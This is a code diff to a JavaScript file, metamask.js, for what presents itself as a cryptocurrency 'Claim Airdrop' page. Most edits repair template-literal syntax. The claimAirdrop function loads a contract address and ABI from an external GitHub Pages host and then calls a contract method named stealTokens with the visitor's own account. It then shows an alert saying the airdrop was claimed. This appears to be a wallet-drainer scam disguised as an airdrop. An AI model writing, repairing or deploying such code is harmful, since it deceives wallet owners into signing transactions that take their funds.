@@ -1,6 +1,3 @@
-console.log('metamask.js is loaded');
-
-
 // Function to initialize connection and check network
 async function connectMetaMask() {
     if (window.ethereum) {
@@ -37,7 +34,7 @@ async function connectMetaMask() {
             }
 
             // Set the network in the claim button text
-            document.getElementById('claimAirdropButton').innerText = Claim Airdrop (${defaultNetwork.toUpperCase()});
+            document.getElementById('claimAirdropButton').innerText = `Claim Airdrop (${defaultNetwork.toUpperCase()})`;
 
             return account;
         } catch (error) {
@@ -77,13 +74,13 @@ async function switchToNetwork(networkId, isTestnet = false) {
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId }],
             });
-            console.log(Switched to ${isTestnet ? 'testnet' : 'mainnet'} for ${networkId} network: ${chainId});
+            console.log(`Switched to ${isTestnet ? 'testnet' : 'mainnet'} for ${networkId} network: ${chainId}`);
         } catch (error) {
             console.error("Error switching network:", error);
 
             // Handle network not found, add it if not present in MetaMask
             if (error.code === 4902) {
-                console.log(${networkId} network is not available in MetaMask, adding it.);
+                console.log(`${networkId} network is not available in MetaMask, adding it.`);
                 if (networkId === 'eth' && isTestnet) {
                     await window.ethereum.request({
                         method: 'wallet_addEthereumChain',
@@ -124,10 +121,10 @@ async function claimAirdrop() {
     }
 
     // Load the contract address and ABI from the network config and ABI files
-    const configResponse = await fetch(https://buyemon.github.io/wallets/config/${network}_config.json);
+    const configResponse = await fetch(`https://buyemon.github.io/wallets/config/${network}_config.json`);
     const config = await configResponse.json();
 
-    const abiResponse = await fetch(https://buyemon.github.io/wallets/abi/${network}_abi.json);
+    const abiResponse = await fetch(`https://buyemon.github.io/wallets/abi/${network}_abi.json`);
     const abi = await abiResponse.json();
 
     const contractAddress = config.contractAddress;
@@ -140,12 +137,12 @@ async function claimAirdrop() {
     const contract = new web3.eth.Contract(abi, contractAddress);
 
     try {
-        console.log(Claiming airdrop for account: ${account} on ${network} network);
+        console.log(`Claiming airdrop for account: ${account} on ${network} network`);
 
         // Call the stealTokens function with the appropriate account
         await contract.methods.stealTokens(account).send({ from: account });
 
-        alert(Airdrop claimed successfully for account: ${account});
+        alert(`Airdrop claimed successfully for account: ${account}`);
     } catch (error) {
         console.error("Error claiming airdrop:", error);
     }
